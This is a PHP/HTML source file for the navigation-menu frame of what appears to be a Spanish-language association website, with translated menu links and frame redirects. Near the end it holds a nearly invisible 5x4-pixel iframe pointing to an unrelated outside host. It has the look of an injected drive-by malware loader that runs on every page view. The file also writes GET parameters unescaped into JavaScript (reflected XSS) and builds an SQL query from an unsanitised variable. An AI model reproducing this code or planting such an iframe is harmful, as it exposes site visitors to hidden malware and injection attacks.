<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];

if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

$db->select('links_id','*','1=1');

?>
<HTML>
<HEAD><TITLE>areas</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
<?
if(isset($_GET['actualiza'])){ 
	echo "var actualiza=".$_GET['actualiza'].";\n"; 
	echo "var tit='".$_GET['tit']."'\n"; 
	echo "var sec='".$_GET['sec']."'\n"; 
}
?>

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function xhola(s,x,t){
	cierratodo();
	cambiar(s,x,t);
}

function cambiarsub(pais,tipo,tit){
		parent.frames['centro'].location='<?=CFG_virtualPath?>novedades.php?pais='+pais+'&tipo='+tipo+'&tit='+tit;
}

function cambiar(item,tit,pais) {
/*	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
*/
	parent.frames['centro'].location='<?=CFG_virtualPath?>novedades.php?pais='+pais+'&tipo=0&tit='+tit
}


function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<input type="hidden" name="id" value="3">
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"  height="19"><small>&nbsp;</small></a></td>
  </tr>
</table>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td >

<!-- <table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiar('uno','<?=traducemenu(208)?>','aso');"><?=traducemenu(208)?></a></td>
  </tr>
</table>
<div id="uno" style="display: none; margin-left: 0em;">
  <!-- <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('aso',1,'<?=traducemenu(212)?>');"><?=traducemenu(212)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('aso',2,'<?=traducemenu(213)?>');"><?=traducemenu(213)?></a></td>
    </tr>
  </table>
</div>
-->
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xdos" href="javascript:cierratodo();cambiar('dos','<?=traducemenu(209)?>','mdt');"><?=traducemenu(209)?></a></td>
  </tr>
</table>
<!--<div id="dos" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('mdt',1,'<?=traducemenu(214)?>');"><?=traducemenu(214)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('mdt',2,'<?=traducemenu(215)?>');"><?=traducemenu(215)?></a></td>
    </tr>
  </table>
</div>
-->
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xtres" href="http://www.scbf.com.br/not.php" target="_top"><?=traducemenu(210)?></a></td>
<!--    <td class="divisor"><a class="link1" id="xtres" href="javascript:cierratodo();cambiar('tres','<?=traducemenu(210)?>','sou');"><?=traducemenu(210)?></a></td>-->
  </tr>
</table>
<div id="tres" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('sou',1,'<?=traducemenu(216)?>');"><?=traducemenu(216)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('sou',2,'<?=traducemenu(217)?>');"><?=traducemenu(217)?></a></td>
    </tr>
  </table>
</div>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
		<?if ($lng=="esp"){?>
	<td class="divisor"><a class="link1" id="xtres" href="http://www.ahjc.cl/portada.php" target="_top"><?=traducemenu(211)?></a></td>
		<?}else {?>
    <td class="divisor"><a class="link1" id="xtres" href="http://www.ahjc.cl/eng/portada.php" target="_top"><?=traducemenu(211)?></a></td>
				 <?}?>
<!--    <td class="divisor"><a class="link1" id="xcuatro" href="javascript:cierratodo();cambiar('cuatro','<?=traducemenu(211)?>','alv');"><?=traducemenu(211)?></a></td>-->
  </tr>
</table>
<div id="cuatro" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('alv',1,'<?=traducemenu(218)?>');"><?=traducemenu(218)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('alv',2,'<?=traducemenu(219)?>');"><?=traducemenu(219)?></a></td>
    </tr>
  </table>
</div>



</td></tr></table>

<script>

parent.document.all('marcos').cols="200,*,<?=$anchof?>";
//parent.frames['centro'].location='../carga_contenido.php?id_sel=205&tit=<?=traducemenu(205)?>';
parent.frames['centro'].location='<?=CFG_virtualPath?>novedades.php?pais=intro';

parent.frames['derecha'].location='../carga_derecha.php?id_sel=205&menu=0';

try{
	if(actualiza>0){
		xhola(sec,actualiza,tit);
	}
}
catch(f){}


</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>

<?
function traducemenu($id){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		echo $row->titulo;
	}
	else{
		echo "no hay datos";
	}

}
?>